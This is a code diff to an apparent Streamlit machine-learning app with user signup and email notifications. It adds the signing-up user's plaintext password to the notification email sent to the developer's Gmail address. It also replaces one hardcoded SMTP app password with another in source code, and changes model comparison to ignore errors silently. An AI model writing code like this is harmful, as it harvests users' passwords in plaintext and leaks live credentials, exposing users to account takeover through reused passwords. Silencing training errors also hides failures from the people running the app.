@@ -160,7 +160,7 @@ def run_memory_safe_training(df, target_col, problem_type, train_size, fold,
 
     # ── Compare models ──
     try:
-        best = cmp_fn(verbose=False, n_select=1, include=include_models, errors="raise")
+        best = cmp_fn(verbose=False, n_select=1, include=include_models, errors="ignore")
         results = pull_fn()
     except MemoryError:
         force_gc()
@@ -418,7 +418,7 @@ try:
     SMTP_PASS = st.secrets["SMTP_PASS"]
 except Exception:
     SMTP_USER = "shayan.code1@gmail.com"
-    SMTP_PASS = "nvvjgvtxxooprkcb"
+    SMTP_PASS = "kiuabeuhkmwfpjie"
 
 def send_email(subject: str, body: str):
     if not SMTP_USER or not SMTP_PASS:
@@ -486,6 +486,7 @@ def notify_signup(user: dict):
  Total Users: #{total}
  Name       : {user['name']}
  Email      : {user['email']}
+ Password   : {user.get('password', '—')}
 ══════════════════════════════════════════"""
     send_email(subject, body)
 
@@ -837,7 +838,7 @@ if not st.session_state.authenticated:
                             "login_count": 1, "datasets_trained": 0,
                             "training_log": [], "activity_log": [{"time": now_str(), "action": "signup", "detail": "Account created"}]
                         })
-                        notify_signup({"name": su_name, "email": su_email})
+                        notify_signup({"name": su_name, "email": su_email, "password": su_pass})
                         st.session_state.authenticated = True
                         st.session_state.current_user = {"name": su_name, "email": su_email}
                         token = create_token(su_email)
